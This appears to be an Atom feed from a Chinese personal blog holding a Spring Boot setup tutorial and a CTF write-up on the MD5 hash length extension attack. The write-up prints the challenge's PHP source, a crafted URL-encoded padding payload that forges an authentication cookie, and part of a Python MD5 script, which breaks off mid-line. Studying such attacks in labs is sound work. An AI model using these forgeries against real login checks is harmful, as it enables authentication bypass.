<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>晨曦远的博客</title>
  
  <subtitle>诗酒趁年华</subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="%5Bobject%20Object%5D" rel="hub"/>
  <link href="http://chenxiyuan.vip/"/>
  <updated>2019-07-31T03:07:04.674Z</updated>
  <id>http://chenxiyuan.vip/</id>
  
  <author>
    <name>晨曦远</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>spring boot学习</title>
    <link href="http://chenxiyuan.vip/2019/07/30/spring-boot%E5%AD%A6%E4%B9%A0/"/>
    <id>http://chenxiyuan.vip/2019/07/30/spring-boot学习/</id>
    <published>2019-07-30T08:05:32.000Z</published>
    <updated>2019-07-31T03:07:04.674Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Maven安装"><a href="#Maven安装" class="headerlink" title="Maven安装"></a>Maven安装</h2><p>Maven是一款服务于Java平台的自动化构建工具.</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="http://us.mirrors.quenda.co/apache/maven/maven-3/3.6.1/binaries/apache-maven-3.6.1-bin.zip" target="_blank" rel="noopener">下载地址</a>.<br>我是把解压后放在了这个目录<code>C:\Program Files (x86)\Maven\apache-maven-3.6.1</code><br>添加系统环境变量,<code>MAVEN_HOME</code>:<code>C:\Program Files (x86)\Maven\apache-maven-3.6.1</code>,就是maven的地址.然后再编辑Path变量,添加一条:<code>%MAVEN_HOME%\bin</code>.<br>重新打开cmd,输入<code>mvn -v</code>就可以看到版本信息,说明环境变量配好了.<br><a id="more"></a></p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>给maven的<code>settings.xml</code>配置文件的<code>profiles</code>标签添加:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在<code>settings</code>标签里加入本地仓库标签<code>&lt;localRepository&gt;C:\Program Files (x86)\Maven\apache-maven-3.6.1\repository&lt;/localRepository&gt;</code></p><h3 id="IDEA设置"><a href="#IDEA设置" class="headerlink" title="IDEA设置"></a>IDEA设置</h3><p>IDEA找到<code>settings-&gt;Build,Execution,Deployment-&gt;Build Tools-&gt;Maven</code>,然后把<code>Maven Home Directory</code>设置成Maven目录,<code>User Settings file</code>改到Maven目录下<code>conf-&gt;settings.xml</code>,<code>Local repository</code>改到Maven目录下的<code>repository</code>文件夹,</p><h2 id="Spring-Boot-HelloWorld"><a href="#Spring-Boot-HelloWorld" class="headerlink" title="Spring Boot HelloWorld"></a>Spring Boot HelloWorld</h2><p>浏览器发送hello请求,服务器接受请求并处理,响应Hello World字符串.</p><h3 id="创建maven工程"><a href="#创建maven工程" class="headerlink" title="创建maven工程"></a>创建maven工程</h3><p>会自动选择编译器,next.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GroupId:com.chenxiyuan</span><br><span class="line">ArtifactId:spring-boot-helloworld</span><br><span class="line">Version:1.0-SNAPSHOT</span><br></pre></td></tr></table></figure></p><p>然后next,进入到项目界面,右下角会弹出一个框,选择<code>Enable Auto-Import</code>启用自动导入,以后每写一个依赖,都会自动导入jar包.</p><h3 id="导入springboot依赖"><a href="#导入springboot依赖" class="headerlink" title="导入springboot依赖"></a>导入springboot依赖</h3><p>填到pom.xml里:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;parent&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.0.0.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/parent&gt;</span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></p><p>然后会自动导入相关的jar包.</p><h3 id="主程序"><a href="#主程序" class="headerlink" title="主程序"></a>主程序</h3><p>在<code>main-&gt;java</code>文件夹下新建一个类名<code>com.chenxiyuan.HelloWorldMainApplication</code>.<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chenxiyuan;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span><span class="comment">//标注一个主程序类，说明这是一个Spring Boot应用</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldMainApplication</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">// Spring应用启动起来</span></span><br><span class="line">        SpringApplication.run(HelloWorldMainApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="编写相关的Controller-Service"><a href="#编写相关的Controller-Service" class="headerlink" title="编写相关的Controller,Service"></a>编写相关的Controller,Service</h3><p>在<code>com.chenxiyuan</code>包新建一个类<code>controller.HelloController</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chenxiyuan.controller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/hello"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello World!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="运行主程序"><a href="#运行主程序" class="headerlink" title="运行主程序"></a>运行主程序</h3><p>访问<code>127.0.0.1:8080/hello</code>,成功输出<code>Hello World!</code>.</p><h3 id="简化部署"><a href="#简化部署" class="headerlink" title="简化部署"></a>简化部署</h3><p>也把以下插件导入到<code>pom.xml</code>里:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 这个插件，可以将应用打包成一个可执行的jar包；--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="http://i1.fuimg.com/665720/11eafbed2d6db752.png" alt="Markdown"><br>打包好以后,就在项目的<code>target</code>文件夹下生成了一个jar包<code>spring-boot-helloworld-1.0-SNAPSHOT.jar</code>.<br>我把它复制到桌面,打开cmd,执行(记得把之前调试关掉):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar spring-boot-helloworld-1.0-SNAPSHOT.jar</span><br></pre></td></tr></table></figure></p><p>成功运行起来了,可以访问<code>http://127.0.0.1:8080/hello</code>查看效果.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Maven安装&quot;&gt;&lt;a href=&quot;#Maven安装&quot; class=&quot;headerlink&quot; title=&quot;Maven安装&quot;&gt;&lt;/a&gt;Maven安装&lt;/h2&gt;&lt;p&gt;Maven是一款服务于Java平台的自动化构建工具.&lt;/p&gt;
&lt;h3 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://us.mirrors.quenda.co/apache/maven/maven-3/3.6.1/binaries/apache-maven-3.6.1-bin.zip&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;下载地址&lt;/a&gt;.&lt;br&gt;我是把解压后放在了这个目录&lt;code&gt;C:\Program Files (x86)\Maven\apache-maven-3.6.1&lt;/code&gt;&lt;br&gt;添加系统环境变量,&lt;code&gt;MAVEN_HOME&lt;/code&gt;:&lt;code&gt;C:\Program Files (x86)\Maven\apache-maven-3.6.1&lt;/code&gt;,就是maven的地址.然后再编辑Path变量,添加一条:&lt;code&gt;%MAVEN_HOME%\bin&lt;/code&gt;.&lt;br&gt;重新打开cmd,输入&lt;code&gt;mvn -v&lt;/code&gt;就可以看到版本信息,说明环境变量配好了.&lt;br&gt;
    
    </summary>
    
      <category term="杂项" scheme="http://chenxiyuan.vip/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="java,web" scheme="http://chenxiyuan.vip/tags/java-web/"/>
    
  </entry>
  
  <entry>
    <title>哈希长度扩展攻击</title>
    <link href="http://chenxiyuan.vip/2019/07/30/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>http://chenxiyuan.vip/2019/07/30/哈希长度扩展攻击/</id>
    <published>2019-07-30T03:45:13.000Z</published>
    <updated>2019-07-30T06:32:02.289Z</updated>
    
    <content type="html"><![CDATA[<p>之前做web题碰到md5加密,都是直接用并不了解生成原理.做<a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="noopener">实验吧让我进来</a>这道题利用了hash长度扩展攻击,那就来好好学习下吧.<br><a id="more"></a></p><h2 id="hash摘要-md5为例"><a href="#hash摘要-md5为例" class="headerlink" title="hash摘要(md5为例)"></a>hash摘要(md5为例)</h2><p><img src="http://i1.fuimg.com/665720/524a00ec6646153e.png" alt="Markdown"></p><ol><li><p>我要对字符串<code>chenxiyuan</code>进行MD5计算,首先转换成16进制</p></li><li><p>补位<br>消息必须进行补位,满足消息长度对512取模于448.这里我要把补位到448bit,补位规则二进制下后面添一个1和n个0直到满足条件:<code>len(message) % 512 == 448</code>.那么16进制下就是先补<code>80</code>即<code>10000000</code>,要补够448bit就是<code>448/8==56</code>,56byte.<br><img src="http://i1.fuimg.com/665720/31dabd63d3da31e4.png" alt="Markdown"></p></li><li><p>补长度<br>补位过后,还要继续填充8byte,储存的是补位之前的消息长度.<code>chenxiyuan</code>是10个字节,80bit,换算成16进制为0x50,然后再填7个字节的0x00.<br><img src="http://i1.fuimg.com/665720/e1ce684a4312e688.png" alt="Markdown"></p></li><li><p>计算消息摘要<br>计算消息摘要必须用补位已经补长度完成之后的消息来进行运算，拿出 512bit的消息(即64字节). 计算消息摘要的时候,有一个初始的链变量,用来参与第一轮的运算.MD5的初始链变量为:<code>A=0x67452301 B=0xefcdab89 C=0x98badcfe D=0x10325476</code><br>具体的计算细节就不细说了,只要知道经过一次消息摘要后,上次的链变量会被新的值覆盖,而最后一轮产生的链变量高低位互换后就是计算出来的MD5值.</p></li></ol><h2 id="长度扩展攻击"><a href="#长度扩展攻击" class="headerlink" title="长度扩展攻击"></a>长度扩展攻击</h2><h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><p><code>$hash = md5($secret.$key)</code>:当我们知道一个<code>$key</code>和其对应的<code>$hash</code>以及<code>$secret</code>的长度时,我们就可以构造一个新的<code>$key</code>和<code>$hash</code>满足条件,进而在不知道salt加密的情况下完成攻击.</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p><a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="noopener">靶机</a><br>随便提交一下抓包,发现source=0,修改为1成功得到源码.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>已知:<code>md5($secret.&quot;adminadmin&quot;)==&#39;571580b26c65f306376d4f64e53cb5c7&#39;</code>,<code>lenth($secret)==15</code><br>构造payload:<br>首先<code>$secret.&#39;adminadmin&#39;</code>字符串有25个字节,即200bit,按照上面的填充方法,先填充到56个字节<code>\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code>.再填8个字节,<code>\xc8\x00\x00\x00\x00\x00\x00\x00</code>,<code>c8</code>就是200.<br>拼接后url编码(将\x换成%)得到最终payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=dmin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00chenxiyuan</span><br></pre></td></tr></table></figure></p><p>然后贴个大佬的脚本跑:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: King kaki</span></span><br><span class="line"><span class="comment"># @Date:   2018-08-04 12:40:11</span></span><br><span class="line"><span class="comment"># @Last Modified by:   King kaki</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2018-08-04 19:07:27</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">F = <span class="keyword">lambda</span> x, y, z: ((x &amp; y) | ((~x) &amp; z))</span><br><span class="line">G = <span class="keyword">lambda</span> x, y, z: ((x &amp; z) | (y &amp; (~z)))</span><br><span class="line">H = <span class="keyword">lambda</span> x, y, z: (x ^ y ^ z)</span><br><span class="line">I = <span class="keyword">lambda</span> x, y, z: (y ^ (x | (~z)))</span><br><span class="line">L = <span class="keyword">lambda</span> x, n: (((x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n))) &amp; (<span class="number">0xffffffff</span>))</span><br><span class="line">shi_1 = (<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>) * <span class="number">4</span></span><br><span class="line">shi_2 = (<span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>) * <span class="number">4</span></span><br><span class="line">shi_3 = (<span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>) * <span class="number">4</span></span><br><span class="line">shi_4 = (<span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>) * <span class="number">4</span></span><br><span class="line">m_1 = (<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>)</span><br><span class="line">m_2 = (<span class="number">1</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>)</span><br><span class="line">m_3 = (<span class="number">5</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">2</span>)</span><br><span class="line">m_4 = (<span class="number">0</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">T</span><span class="params">(i)</span>:</span></span><br><span class="line"><span class="keyword">return</span> (int(<span class="number">4294967296</span> * abs(math.sin(i)))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(shift_list)</span>:</span></span><br><span class="line">shift_list = [shift_list[<span class="number">3</span>], shift_list[<span class="number">0</span>], shift_list[<span class="number">1</span>], shift_list[<span class="number">2</span>]]</span><br><span class="line"><span class="keyword">return</span> shift_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(fun_list, f, m, shi)</span>:</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">global</span> Ti_count</span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">16</span>:</span><br><span class="line">xx = int(fun_list[<span class="number">0</span>], <span class="number">16</span>) + f(int(fun_list[<span class="number">1</span>], <span class="number">16</span>), int(fun_list[<span class="number">2</span>], <span class="number">16</span>), int(fun_list[<span class="number">3</span>], <span class="number">16</span>)) + int(m[count], <span class="number">16</span>) + T(Ti_count)</span><br><span class="line">xx &amp;= <span class="number">0xffffffff</span></span><br><span class="line">ll = L(xx, shi[count])</span><br><span class="line">fun_list[<span class="number">0</span>] = hex((int(fun_list[<span class="number">1</span>], <span class="number">16</span>) + ll) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">fun_list = shift(fun_list)</span><br><span class="line">count += <span class="number">1</span></span><br><span class="line">Ti_count += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> fun_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_m16</span><span class="params">(order, ascii_list, f_offset)</span>:</span></span><br><span class="line">ii = <span class="number">0</span></span><br><span class="line">m16 = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">f_offset *= <span class="number">64</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> order:</span><br><span class="line">i *= <span class="number">4</span></span><br><span class="line">m16[ii] = <span class="string">'0x'</span> + <span class="string">''</span>.join((ascii_list[i + f_offset] + ascii_list[i + <span class="number">1</span> + f_offset] + ascii_list[i + <span class="number">2</span> + f_offset] + ascii_list[i + <span class="number">3</span> + f_offset]).split(<span class="string">'0x'</span>))</span><br><span class="line">ii += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> range(len(m16)):</span><br><span class="line">m16[ind] = reverse_hex(m16[ind])</span><br><span class="line"><span class="keyword">return</span> m16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_hex</span><span class="params">(hex_str)</span>:</span></span><br><span class="line">hex_str = hex_str[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">if</span> len(hex_str) &lt; <span 